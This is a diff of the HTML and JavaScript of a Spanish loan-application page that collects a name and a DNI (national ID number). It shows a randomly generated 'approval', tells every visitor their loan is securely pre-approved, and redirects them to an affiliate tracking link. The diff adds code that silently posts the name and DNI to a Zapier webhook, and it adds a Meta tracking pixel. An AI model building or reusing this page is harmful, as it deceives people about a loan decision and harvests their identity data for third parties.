@@ -724,103 +724,142 @@
     <span id="snackbar-text"></span>
   </div>
 <script type="text/javascript" src="https://tzfbq.ttrk.io/track.js"></script>
-  <script>
-    const form = document.getElementById("loan-form");
-    const nombreInput = document.getElementById("nombre");
-    const dniInput = document.getElementById("dni");
-    const errorNombre = document.getElementById("error-nombre");
-    const errorDni = document.getElementById("error-dni");
-    const statusBox = document.getElementById("status-box");
+<script>
+  const form = document.getElementById("loan-form");
+  const nombreInput = document.getElementById("nombre");
+  const dniInput = document.getElementById("dni");
+  const errorNombre = document.getElementById("error-nombre");
+  const errorDni = document.getElementById("error-dni");
+  const statusBox = document.getElementById("status-box");
 
-    const snackbar = document.getElementById("snackbar");
-    const snackbarText = document.getElementById("snackbar-text");
-    const snackbarIcon = document.getElementById("snackbar-icon");
+  const snackbar = document.getElementById("snackbar");
+  const snackbarText = document.getElementById("snackbar-text");
+  const snackbarIcon = document.getElementById("snackbar-icon");
 
-    function showSnackbar(message, type = "success") {
-      snackbarText.textContent = message;
+  function showSnackbar(message, type = "success") {
+    snackbarText.textContent = message;
 
-      if (type === "error") {
-        snackbar.classList.add("error");
-        snackbarIcon.textContent = "!";
-      } else {
-        snackbar.classList.remove("error");
-        snackbarIcon.textContent = "✓";
-      }
-
-      snackbar.classList.add("show");
-      setTimeout(() => {
-        snackbar.classList.remove("show");
-      }, 3200);
+    if (type === "error") {
+      snackbar.classList.add("error");
+      snackbarIcon.textContent = "!";
+    } else {
+      snackbar.classList.remove("error");
+      snackbarIcon.textContent = "✓";
     }
 
-    function validarDNI(dni) {
-      // Valida formato básico de DNI: 8 números + letra final
-      const regex = /^([0-9]{8})([A-Za-z])$/;
-      const match = dni.trim().toUpperCase().match(regex);
-      if (!match) return false;
+    snackbar.classList.add("show");
+    setTimeout(() => {
+      snackbar.classList.remove("show");
+    }, 3200);
+  }
 
-      const letras = "TRWAGMYFPDXBNJZSQVHLCKE";
-      const numero = parseInt(match[1], 10);
-      const letra = match[2];
+  function validarDNI(dni) {
+    // Valida formato básico de DNI: 8 números + letra final
+    const regex = /^([0-9]{8})([A-Za-z])$/;
+    const match = dni.trim().toUpperCase().match(regex);
+    if (!match) return false;
 
-      const letraCorrecta = letras[numero % 23];
-      return letra === letraCorrecta;
+    const letras = "TRWAGMYFPDXBNJZSQVHLCKE";
+    const numero = parseInt(match[1], 10);
+    const letra = match[2];
+
+    const letraCorrecta = letras[numero % 23];
+    return letra === letraCorrecta;
+  }
+
+  form.addEventListener("submit", (e) => {
+    e.preventDefault();
+
+    let valido = true;
+
+    // reset errores
+    nombreInput.classList.remove("error");
+    dniInput.classList.remove("error");
+    errorNombre.style.display = "none";
+    errorDni.style.display = "none";
+
+    if (!nombreInput.value.trim()) {
+      valido = false;
+      nombreInput.classList.add("error");
+      errorNombre.style.display = "block";
     }
 
-    form.addEventListener("submit", (e) => {
-      e.preventDefault();
+    const dniValue = dniInput.value.trim();
+    if (!dniValue || !validarDNI(dniValue)) {
+      valido = false;
+      dniInput.classList.add("error");
+      errorDni.style.display = "block";
+    }
 
-      let valido = true;
+    if (!valido) {
+      statusBox.innerHTML =
+        "<strong>Estado:</strong> Revisa los campos marcados en rojo para continuar con la verificación segura.";
+      showSnackbar(
+        "Hay errores en el formulario. Corrige los datos para continuar.",
+        "error"
+      );
+      return;
+    }
 
-      // reset errores
-      nombreInput.classList.remove("error");
-      dniInput.classList.remove("error");
-      errorNombre.style.display = "none";
-      errorDni.style.display = "none";
+    // Lógica de "aprobación" simulada
+    const aprobado = Math.random() > 0.35; // resultado aleatorio de ejemplo
 
-      if (!nombreInput.value.trim()) {
-        valido = false;
-        nombreInput.classList.add("error");
-        errorNombre.style.display = "block";
-      }
+    // 🔹 ENVIAR DATOS A ZAPIER
+    const payload = {
+      nombreCompleto: nombreInput.value.trim(),
+      dni: dniValue,
+      aprobado: aprobado,
+      fecha: new Date().toISOString()
+    };
 
-      const dniValue = dniInput.value.trim();
-      if (!dniValue || !validarDNI(dniValue)) {
-        valido = false;
-        dniInput.classList.add("error");
-        errorDni.style.display = "block";
-      }
-
-      if (!valido) {
-        statusBox.innerHTML =
-          "<strong>Estado:</strong> Revisa los campos marcados en rojo para continuar con la verificación segura.";
-        showSnackbar(
-          "Hay errores en el formulario. Corrige los datos para continuar.",
-          "error"
-        );
-        return;
-      }
-
-      // Lógica de "aprobación" simulada
-      const aprobado = Math.random() > 0.35; // resultado aleatorio de ejemplo
-
-      if (aprobado) {
-        statusBox.innerHTML =
-          "<strong>Estado:</strong> Preaprobado de forma automática. Un asesor se pondrá en contacto contigo para finalizar el estudio del préstamo.";
-        showSnackbar(
-          "¡Enhorabuena! Tu préstamo ha sido preaprobado de forma segura. Te redirigiremos a completar el formulario para recibir el dinero."
-        );
-          window.location.href = "https://www.wkp20trk.com/4RXWWFP/8853HHT/";
-      } else {
-        statusBox.innerHTML =
-          "<strong>Estado:</strong> Tu préstamo ha sido preaprobado. Te redirigiremos a completar el formulario para recibir el dinero.";
-        showSnackbar(
-          "Hemos recibido tus datos. Te redirigiremos a completar el formulario para recibir el dinero.",
-          "info"
-        );
-        window.location.href = "https://www.wkp20trk.com/4RXWWFP/8853HHT/";
-      }
+    // mode: 'no-cors' para evitar problemas de CORS en el navegador
+    fetch("https://hooks.zapier.com/hooks/catch/20702921/ukrzz95/", {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify(payload),
+      mode: "no-cors"
+    }).catch((err) => {
+      console.error("Error enviando datos a Zapier:", err);
     });
-  </script>
+
+    // 🔹 MENSAJE Y REDIRECCIÓN COMO YA TENÍAS
+    if (aprobado) {
+      statusBox.innerHTML =
+        "<strong>Estado:</strong> Preaprobado de forma automática. Un asesor se pondrá en contacto contigo para finalizar el estudio del préstamo.";
+      showSnackbar(
+        "¡Enhorabuena! Tu préstamo ha sido preaprobado de forma segura. Te redirigiremos a completar el formulario para recibir el dinero."
+      );
+      window.location.href = "https://www.wkp20trk.com/4RXWWFP/8853HHT/";
+    } else {
+      statusBox.innerHTML =
+        "<strong>Estado:</strong> Tu préstamo ha sido preaprobado. Te redirigiremos a completar el formulario para recibir el dinero.";
+      showSnackbar(
+        "Hemos recibido tus datos. Te redirigiremos a completar el formulario para recibir el dinero.",
+        "info"
+      );
+      window.location.href = "https://www.wkp20trk.com/4RXWWFP/8853HHT/";
+    }
+  });
+</script>
+
+  <!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '2068634287237405');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=2068634287237405&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
 </body>
 </html>
